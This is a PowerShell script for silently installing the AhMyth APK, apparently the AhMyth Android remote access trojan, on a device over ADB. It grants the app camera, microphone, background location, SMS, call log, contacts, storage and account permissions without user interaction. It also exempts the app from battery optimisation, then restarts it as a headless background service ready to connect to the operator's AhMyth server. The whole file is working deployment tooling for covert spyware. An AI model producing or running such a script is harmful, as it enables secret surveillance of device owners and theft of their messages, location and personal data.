# AhMyth Silent Install Script
# Installs APK and grants ALL permissions via ADB - No user interaction required

param(
    [string]$ApkPath = "..\AhMyth-Server\app\Factory\Ahmyth-aligned-debugSigned.apk",
    [string]$DeviceId = ""
)

$ErrorActionPreference = "Continue"
$pkg = "ahmyth.mine.king.ahmyth"

Write-Host ""
Write-Host "╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║              AhMyth Silent Install Script                     ║" -ForegroundColor Cyan
Write-Host "║        Automatic Permission Grant via ADB                     ║" -ForegroundColor Cyan
Write-Host "╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""

# Check ADB
$adb = "adb"
if (-not (Get-Command $adb -ErrorAction SilentlyContinue)) {
    $adb = "$env:LOCALAPPDATA\Android\Sdk\platform-tools\adb.exe"
    if (-not (Test-Path $adb)) {
        Write-Host "[ERROR] ADB not found. Install Android SDK or add to PATH." -ForegroundColor Red
        exit 1
    }
}

# Get device
if ($DeviceId -eq "") {
    $devices = & $adb devices | Select-String "device$" | ForEach-Object { ($_ -split "\s+")[0] }
    if ($devices.Count -eq 0) {
        Write-Host "[ERROR] No devices connected. Enable USB debugging and connect device." -ForegroundColor Red
        exit 1
    }
    $DeviceId = $devices[0]
}

Write-Host "[*] Target device: $DeviceId" -ForegroundColor Yellow

# Check APK
if (-not (Test-Path $ApkPath)) {
    Write-Host "[ERROR] APK not found: $ApkPath" -ForegroundColor Red
    exit 1
}

Write-Host "[*] APK: $ApkPath" -ForegroundColor Yellow
Write-Host ""

# Install APK
Write-Host "[1/4] Installing APK..." -ForegroundColor Cyan
& $adb -s $DeviceId install -r -g $ApkPath 2>&1 | Out-Null
if ($LASTEXITCODE -ne 0) {
    Write-Host "[!] Install with -g failed, trying without..." -ForegroundColor Yellow
    & $adb -s $DeviceId install -r $ApkPath 2>&1 | Out-Null
}
Write-Host "[OK] APK installed" -ForegroundColor Green

# Grant runtime permissions
Write-Host "[2/4] Granting runtime permissions..." -ForegroundColor Cyan

$permissions = @(
    # Camera & Media
    "CAMERA",
    "RECORD_AUDIO",
    "MODIFY_AUDIO_SETTINGS",
    
    # Location
    "ACCESS_FINE_LOCATION",
    "ACCESS_COARSE_LOCATION",
    "ACCESS_BACKGROUND_LOCATION",
    
    # Contacts & Calls
    "READ_CONTACTS",
    "WRITE_CONTACTS",
    "READ_CALL_LOG",
    "READ_PHONE_STATE",
    "CALL_PHONE",
    "PROCESS_OUTGOING_CALLS",
    
    # SMS
    "READ_SMS",
    "SEND_SMS",
    "RECEIVE_SMS",
    
    # Storage
    "READ_EXTERNAL_STORAGE",
    "WRITE_EXTERNAL_STORAGE",
    
    # Android 13+
    "POST_NOTIFICATIONS",
    "READ_MEDIA_IMAGES",
    "READ_MEDIA_VIDEO",
    "READ_MEDIA_AUDIO",
    
    # Accounts
    "GET_ACCOUNTS"
)

$granted = 0
foreach ($perm in $permissions) {
    $result = & $adb -s $DeviceId shell pm grant $pkg android.permission.$perm 2>&1
    if ($result -notmatch "Exception|Error") {
        $granted++
    }
}
Write-Host "[OK] Granted $granted permissions" -ForegroundColor Green

# Disable battery optimization
Write-Host "[3/4] Disabling battery optimization..." -ForegroundColor Cyan
& $adb -s $DeviceId shell dumpsys deviceidle whitelist +$pkg 2>&1 | Out-Null
& $adb -s $DeviceId shell cmd appops set $pkg RUN_IN_BACKGROUND allow 2>&1 | Out-Null
& $adb -s $DeviceId shell cmd appops set $pkg RUN_ANY_IN_BACKGROUND allow 2>&1 | Out-Null
Write-Host "[OK] Battery optimization disabled" -ForegroundColor Green

# Start app
Write-Host "[4/4] Starting application..." -ForegroundColor Cyan
& $adb -s $DeviceId shell am start -n $pkg/.MainActivity 2>&1 | Out-Null
Start-Sleep -Seconds 2

# Force stop to trigger headless mode
& $adb -s $DeviceId shell am force-stop $pkg 2>&1 | Out-Null
Start-Sleep -Milliseconds 500

# Restart service directly
& $adb -s $DeviceId shell am startservice $pkg/.MainService 2>&1 | Out-Null
Write-Host "[OK] Application started in background" -ForegroundColor Green

Write-Host ""
Write-Host "╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Green
Write-Host "║                    INSTALLATION COMPLETE                      ║" -ForegroundColor Green
Write-Host "╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Green
Write-Host ""
Write-Host "The app is now running silently in the background." -ForegroundColor White
Write-Host "Start your AhMyth server and the device should connect." -ForegroundColor White
Write-Host ""

